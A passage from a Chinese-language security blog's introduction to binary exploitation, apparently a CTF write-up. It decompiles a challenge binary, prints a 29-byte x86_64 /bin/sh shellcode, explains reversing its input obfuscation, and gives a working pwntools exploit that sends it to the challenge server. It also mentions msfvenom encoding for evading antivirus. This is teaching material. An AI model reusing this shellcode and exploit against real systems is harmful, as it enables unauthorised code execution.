punctuation">)</span>count<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>count <span class="token operator">*</span> cVar1<span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token punctuation">}</span><br><br>        <span class="token comment">// set execute permissions</span><br>        mem_perm_result <span class="token operator">=</span> <span class="token function">mprotect</span><span class="token punctuation">(</span>__buf<span class="token punctuation">,</span>PAGE_SIZE<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mem_perm_result <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>            <span class="token function">free</span><span class="token punctuation">(</span>__buf<span class="token punctuation">)</span><span class="token punctuation">;</span><br>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Failed to set memory permissions.\n"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token punctuation">}</span><br><br>        <span class="token comment">// run shellcode</span><br>        <span class="token punctuation">(</span><span class="token operator">*</span>__buf<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><br>    <span class="token function">free</span><span class="token punctuation">(</span>__buf<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><br><span class="token punctuation">}</span></code></pre><p>這次沒有任何需要 overflow 的地方，也跟 memory protection 沒什麼關係，因為程式會跟我們要輸入然後直接執行，所以我們只要確保輸入的 shellcode 沒問題就可以了。</p><h3 id="how-to-generate-shellcode%3F"><a href="#how-to-generate-shellcode%3F" class="direct-link">#</a> how to generate shellcode?</h3><p>要產生 shellcode 有三種方式：自己寫、用工具產、上網找。</p><p>最扎實的方式是自己寫，你可以先用 c 把程式寫出來，然後把編譯完的結果 copy paste，或是直接用組語寫，然後用 <code>nasm</code> 轉換。教學文網路上很多，這裡附上我自己覺得滿好懂的文章：<a href="https://www.vividmachines.com/shellcode/shellcode.html" rel="noopener noreferrer" target="_blank">Shellcoding for Linux and Windows Tutorial</a></p><p>用工具產也是很常用的方法，最方便的是用 metasploit 的 msfvenom，好處是你可以控制一些參數（例如 reverse shell 要用的 IP 跟 port）跟彈性（例如加上一些 encoding 來規避防毒或是躲過 WAF），但又可以保有自動化的特性。</p><p>當然，上網找也是一個方法。最常用的線上資源大概就是 <a href="http://shell-storm.org/shellcode/" rel="noopener noreferrer" target="_blank">shellstorm</a> 跟 <a href="https://www.exploit-db.com/shellcodes" rel="noopener noreferrer" target="_blank">ExploitDB</a> 這兩個地方，收藏了各種 architecture、功能、長度的 shellcode。如果不用任何客製化，例如只是要做到 local 開 shell 或是讀取 flag.txt 等固定功能，在上面應該可以輕鬆找到可以直接用的 shellcode。</p><p>這題我從 shellstorm 選了一個非常短的 payload：<a href="http://shell-storm.org/shellcode/files/shellcode-905.php" rel="noopener noreferrer" target="_blank">x86_64 execveat("/bin//sh") 29 bytes shellcode</a>，當然這不是唯一會成功的，你可以選別的自己試試看，然後嘗試 local debug 判斷為什麼有些會成功有些會失敗。</p><h3 id="bypass-obfuscation"><a href="#bypass-obfuscation" class="direct-link">#</a> bypass obfuscation</h3><p>有了 shellcode 之後，就可以來看看中間 processing 的部分了。</p><p><code>if ((count & 1) == 0)</code> 就是判斷 count 的奇偶，最後一個 bit 是 1 的話（奇數）<code>cVar1 = -1</code>，最後一個 bit 是 0 的話（偶數）<code>cVar1 = 1</code>。這個 count 的奇偶性質會被用來 in place 修改輸入的資訊：<code>__buf[count] = (__buf[count] + count * cVar1);</code>，也就是說把每一個字元用 16 進位表示法作運算，第 0 個 +0，第 1 個 -1，第 2 個 +2，第 3 個 -3⋯⋯ 更動每一個輸入。</p><p>你可以把原本的 shellcode 輸入進去，然後在 processing 結束的地方設一個中斷點，看一下兩者之間的差別，就可以清楚看出邏輯了。從 6a 開始，下一個從 0x42 變成 0x41，0x58 變成 0x5a，直到最後 0x05 被 +28 變成 0x21：</p><pre class="language-txt"><code class="language-txt"># original shellcode<br>#0x559a4fc78000:	0x529948c4fe58426a	0x2f2f6e69622fbf48<br>#0x559a4fc78010:	0xd089495e54576873	0x00000a 050fd28949<br><br># modified shellcode<br>#                      - + - + - + - +     - + - + - + - +<br>#0x559a4fc78000:	0x4b9f43c8fb5a416a	0x203d61755739b650<br>#0x559a4fc78010:	0xb99f347241695783	0x0000ed 21f4ec7061</code></pre><p>所以我們只要在送出 shellcode 前反向操作，把加減處理好，送過去之後程式就會把它還原成我們的 shellcode 了。用 pwntools 寫的 exploit 如下（要特別注意的是 overflow 和 underflow 的處理）：</p><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><br><br><span class="token comment">#p = process('./shellcoded')</span><br>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.ctf.games'</span><span class="token punctuation">,</span> <span class="token number">32383</span><span class="token punctuation">)</span><br><br>sc <span class="token operator">=</span> <span class="token string">b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'</span><br><br>new_sc <span class="token operator">=</span> <span class="token string">''</span><br><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span><br>        m <span class="token operator">=</span> <span class="token number">1</span><br>    <span class="token keyword">else</span><span class="token punctuation">:</span><br>        m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><br>    v <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>sc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> m<span class="token operator">*</span>i<br>    <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><br>    <span class="token keyword">if</span> v<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span><br>        new_sc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><br>    <span class="token keyword">elif</span> v<span class="token operator">></span><span class="token number">255</span><span class="token punctuation">:</span><br>        new_sc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v<span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span><br>    <span class="token keyword">else</span><span class="token punctuation">:</span><br>	    new_sc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><br><br>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><br>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_sc<span class="token punctuation">)</span><br>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="%E7%B5%90%E8%AA%9E"><a href="#%E7%B5%90%E8%AA%9E" class="direct-link">#</a> 結語</h2><p>做 binary exploitation 的喜歡 segmentation fault 就跟做 web 的喜歡 500 internal server error 差不多，只要可以讓程式出現非預期的錯誤就有希望 XDDD</p><p>雖然到目前為止介紹的都還是 pwn 中最粗淺的皮毛，但希望多少有勾起大家的興趣，讓大家從記憶體的角度出發想想自己寫的程式碼如何運作，發出『哦原來是這樣的呀』的感嘆。</p><p>下一篇我們再來探討 pwn 中最常聽到的 ROP 是如何運作的，gadget 是什麼，以及如何構造進階一些的 exploit。</p><div class="article-footer"><a href="https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/" on-click="share"><img src="/img/icons/icon_external link hyperlink.svg" height="24" width="24" alt="Share">Share this post</a></div><div><p style="font-weight: bold;">Tag</p><div class="post-tags"><a href="/tags/security/" class="post-tag">#Security</a> <a href="/tags/reverse-engineering/" class="post-tag">#Reverse Engineering</a> <a href="/tags/binary-exploitation/" class="post-tag">#Binary Exploitation</a></div><p style="font-weight: bold;">Recommendation</p><ol><li><a href="/posts/genchilu/concurrency-paradigms-golang-and-java-zh/">並行程式典範 (Paradigms): Golang V.S. Java</a></li><li><a href="/posts/jo/zerobased-common-risk-fix/">資安科普番外篇（二）-如何有效率選擇風險進行修復 feat.風險和法規息息相關？！</a></li><li><a href="/posts/nick/shodan-fofa/">駭客起手式 : Shodan & Fofa</a></li><li><a href="/posts/jo/zerobased-cross-site-scripting/">零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）</a></li><li><a href="/posts/maxchiu/turbofan/">從編譯器優化角度初探 Javascript的V8 引擎</a></li></ol></div><div class="article-author"><img src="/img/authors/crystal_logo.png" alt="crystal" class="article-author__img" data-deopt="true"><div class="article-author__info"><div class="article-author__title">Author</div><div class="article-author__author"><a href="/posts/crystal">crystal</a></div><div class="article-author__intro">Security newbie with a gallon of passion</div></div></div><p style="font-weight: bold;">Discussion(login required)</p><script async="" src="https://utteranc.es/client.js" crossorigin="anonymous" id="utterance-script" issue-term="title" label="utterance" repo="cymetrics/blog" theme="github-light"></script><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"PWN 入門 - buffer overflow 是什麼？","image":["https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/c-to-stack-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/stack-overflow-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-run-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-main-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-vuln-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-checksec-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-func-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-win-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-abort-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-break-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-stack-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/retcheck-flag-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/shellcoded-run-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/crystal/pwn-intro/shellcoded-ghidra-1920w.jpg","https://tech-blog.cymetrics.io/img/icons/icon_external link hyperlink.svg","https://tech-blog.cymetrics.io/img/authors/crystal_logo.png"],"author":{"@type":"Person","name":"crystal"},"publisher":{"@type":"Organization","name":"Cymetrics Tech Blog","url":"https://tech-blog.cymetrics.io","logo":{"@type":"ImageObject","url":"https://tech-blog.cymetrics.io/img/favicon/favicon-512x512.png","width":512,"height":512}},"url":"https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/","mainEntityOfPage":"https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/","datePublished":"2021-09-29","dateModified":"2021-12-29","description":"你可能在很多 CVE 裡都看過 buffer overflow 這個名詞，但你知道這個弱點是如何引發 RCE 這麼嚴重的問題的嗎？這次讓我們來透過幾個簡單小題目看看 buffer overflow 如何發生，又該如何 exploit。 在開始之前，請先閱讀 Reverse 101..."}</script></article></main><footer><div class="footer-logos"><a href="https://www.facebook.com/Cymetrics-100957872049641" rel="noopener noreferrer" target="_blank"><img src="/img/icons/icon_social media_facebook.svg" height="30" width="30" alt="facebook"></a><a href="https://www.linkedin.com/company/onedegree-hk" rel="noopener noreferrer" target="_blank"><img src="/img/icons/icon_social media_linkedln.svg" height="30" width="30" alt="linkedin"></a><a href="https://tech-blog.cymetrics.io/feed/feed.xml" rel="noreferrer noopener" target="_blank"><img src="/img/icons/rss-feed.svg" height="30" width="30" alt="rss feed"></a></div><div class="copyright">© 2021 Cymetrics Tech Blog, based on <a href="https://github.com/google/eleventy-high-performance-blog" rel="noopener noreferrer" target="_blank">eleventy-high-performance-blog</a></div></footer><script>// light/dark theme switch
      // disable dark mode for now
      const menuBtn = document.querySelector('.menu__btn')
      menuBtn.addEventListener('click', function() {
        document.querySelector('body').classList.toggle('lock')
        menuBtn.classList.toggle('menu__btn--close');
        document.querySelector('.nav__links').classList.toggle('nav__links--open')
      })</script></body></html>